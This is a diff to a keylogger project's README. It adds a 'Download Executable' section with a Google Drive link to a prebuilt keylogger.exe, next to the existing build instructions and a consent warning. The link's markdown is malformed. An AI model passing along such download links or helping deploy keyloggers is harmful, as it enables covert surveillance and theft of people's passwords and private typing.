@@ -44,6 +44,15 @@ If you want to build the .exe yourself using PyInstaller:
 Running the Executable
 Once the .exe is built, you can run the keylogger.exe directly. The password is stored in the password.txt file.
 
+                                    OR 
+
+## 🔗 Download Executable
+
+You can download the file directly from Google Drive:
+
+[📥 Download keylogger.exe]([https://drive.google.com/your-shared-link-here](https://drive.google.com/drive/folders/1eUFX-OiuKtKUhrbVuqXkfcKWO5CHfSJi?usp=sharing))
+
+
 Important Warning: Use this application responsibly. It is crucial to obtain proper consent before monitoring or recording someone's activity.
 
 License
